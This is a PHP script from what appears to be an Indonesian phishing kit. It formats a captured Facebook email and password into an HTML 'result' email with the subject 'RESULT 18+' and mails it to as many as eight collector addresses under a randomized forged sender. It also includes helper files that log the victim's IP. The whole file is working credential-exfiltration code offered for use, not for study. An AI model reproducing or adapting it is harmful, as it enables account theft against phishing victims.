<?php

//mencegah masuk tanpa method get
if($email == "" && $total == ""){
$url = $_SERVER['PHP_SELF'];
header("Location: send.php");
}

//jenis ress
$coda = 'RESS ZYY JATIM !!';
$spin = 'RESS ZYY JATIM !!';
$claim = 'RESS ZYY JATIM !!';

//jenis mail
$coda_mail = 'coda';
$spin_mail = 'spin';
$claim_mail = 'claim';

//get setting
include 'setting.php';

//method get
$total = '1';

//mengambil random isian
include 'log-gen.php';
include 'log-ip.php';
$noperess = '08'.rand(1000000,9999999999);

$log=array("Facebook", "VK");
$random_log=array_rand($log,2);

//info sendmail
$emailku = $email;
$logress = $log[$random_log[0]];
$idress = rand(100000000,9999999999);
$subjek = "RESULT 18+ PUNYA SI | $mailress";
$pesan = <<<EOD
<!DOCTYPE html>
<html>
<head>
<title></title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<style type="text/css">
body {
	font-family: "Helvetica";
	width: 90%;
	display: block;
	margin: auto;
	border: 1px solid #fff;
	background: #fff;
}

.result {
	width: 100%;
	height: 100%;
	display: block;
	margin: auto;
	position: fixed;
	top: 0;
	right: 0;
	left: 0;
	bottom: 0;
	z-index: 999;
	overflow-y: scroll;
}

.tblResult {
	width: 100%;
	display: table;
	margin: 0px auto;
	border-collapse: collapse;
	text-align: center;
	background: #FFF;
}

.tblResult th {
	text-align: left;
	font-size: 0.75em;
	margin: auto;
	padding: 15px 10px;
	background: #OFF99;
	border: 2px solid #OFF99;
	color: #000;
}

.tblResult td {
	font-size: 0.75em;
	margin: auto;
	padding: 10px;
	border: 2px solid #OFF99;
	text-align: left;
	font-weight: bold;
	color: #0B0B0B;
	text-shadow: 0px 0px 10px #fff;
}

.tblResult th img {
	width: 45px;
	display: block;
	margin: auto;
	border-radius: 50%;
	box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
}
</style>
</head>
<body>
<div class="result">
<table class="tblResult">
<tr>
<div style="background: url(https://i.postimg.cc/44Vv4jTp/20220921-221046.jpg) no-repeat;border:2px solid white;background-size: 100% 100%; width: 294; height: 101px; color: #996633; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" bordercolor="#19233f" style="color:#fff;border-radius:8px; border:3px solid white; border-collapse:collapse;width:100%;background:#996633;">
    <tr>
<th style="text-align: center;" colspan="3"> Info Facebook </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email</td>
					<td style="text-align: center;">$mailress</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$passress</td>
				</tr>
				
				<tr>
					<th style="text-align: center;" colspan="3">&copy; RASYA HOSTING </th>
				</tr>
			</table>
		</div>
	</body>
	</html
EOD;
				
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$random_sender = rand();
$sender = 'From:'.$jenisress.'<'.$jenismail.$random_sender.'@Web Galih>';
$headers .= ''.$sender.'' . "\r\n";
				
//loop sendmail sesuai total
for ($i = 0; $i < $total; $i++){
mail($email1, $subjek, $pesan, $headers);
mail($email2, $subjek, $pesan, $headers);
mail($email3, $subjek, $pesan, $headers);
mail($email4, $subjek, $pesan, $headers);
mail($email5, $subjek, $pesan, $headers);
mail($email6, $subjek, $pesan, $headers);
mail($email7, $subjek, $pesan, $headers);
mail($email8, $subjek, $pesan, $headers);
sleep(5);
die;
}
?>